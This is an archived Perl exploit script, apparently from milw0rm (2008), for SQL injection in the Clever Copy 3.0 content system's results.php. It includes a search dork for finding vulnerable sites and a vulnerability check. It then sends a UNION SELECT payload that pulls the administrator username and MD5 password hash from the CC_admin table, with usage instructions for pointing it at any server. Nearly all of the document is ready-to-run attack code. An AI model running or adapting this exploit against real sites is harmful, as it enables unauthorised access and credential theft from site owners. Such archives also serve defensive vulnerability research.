<html><head><title>Clever Copy 3.0 (results.php) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
######################
#
#Clever Copy (results.php) Remote SQL Injection Exploit
#
######################
#
#Bug by: h0yt3r
#
#Dork: &quot;powered by Clever Copy&quot;
#
##
###
##
#
#This simple Exploit will give you Admin Username and md5(Password)
#Pls don't use this to crack sites :P
#
#Gr33tz go to:
#thund3r, ramon, b!zZ!t, Free-Hack, Sys-Flaw and of course the ultimate h4ck-y0u Team
#

use LWP::UserAgent;
my $userAgent = LWP::UserAgent-&gt;new;

usage();

$server =   $ARGV[0];
$dir = $ARGV[1];

print&quot;\n&quot;;
if (!$dir) { die &quot;Read Usage!\n&quot;; }

$filename =&quot;results.php&quot;;
my $url = &quot;http://&quot;.$server.$dir.$filename;

my $Attack= $userAgent-&gt;get($url);
if ($Attack-&gt;is_success)
{
    print &quot;[x] Attacking &quot;.$url.&quot;\n&quot;;
}
else
{
    print &quot;Couldn't connect to &quot;.$url.&quot;!&quot;;
    exit;
}

print &quot;[x] Vulnerable Check:&quot;;

my $check = $url.&quot;?%73%74%61%72%74%3D%30%26%73%65%61%72%63%68%74%65%72%6D%3D%43%43%4E%65%77%73%26%73%65%61%72%63%68%74%79%70%65%3D%27&quot;;

my $Attack= $userAgent-&gt;get($check);
if($Attack-&gt;content =~ m/You have an error in your SQL syntax/i)
{
    print &quot; Vulnerable!\n&quot;;    
}
else
{
    print &quot; Not Vulnerable!&quot;;
    exit;
}

print &quot;[x] Injecting Black Magic\n&quot;;

my $Injection = &quot;?start=0&amp;searchterm=CCNews&amp;searchtype=category union select 1,2,3,4,5,6,concat(char(104,48,121,116,51,114),username,0x3a,password,char(104,48,121,116,51,114)),8,9,10,11,12,13,14,15,16,17 from CC_admin/*&quot;;

my $Final = $url.&quot;?seiten_id=461&amp;sprache_id=1&quot;.$Injection;
my $Attack= $userAgent-&gt;get($Final);    

if($Attack-&gt;content =~ m/&lt;br&gt;h0yt3r(.*?):(.*?)h0yt3r&lt;br&gt;/i)
{    
    my $login = $1;
    my $pass = $2;
    print &quot;[x] Success!\n&quot;;
    print &quot;[x] Admin Details:\n&quot;;

    print &quot;    Username: &quot;.$login.&quot;\n&quot;;
    print &quot;    Password: &quot;.$pass.&quot;\n&quot;;
}
else
{
    print&quot;[x] Something wrong...&quot;;
    exit;

}

sub usage()
{
    print q
    {
    #####################################################
        Clever Copy Remote SQL Injection Exploit
            -Written by h0yt3r-
    Usage: Clever_Copy.pl [Server] [Path]
    Sample:
    perl Clever_Copy.pl www.site.com /clevercopy/
    ######################################################
    };

}
#eof 

# milw0rm.com [2008-06-12]</pre></html>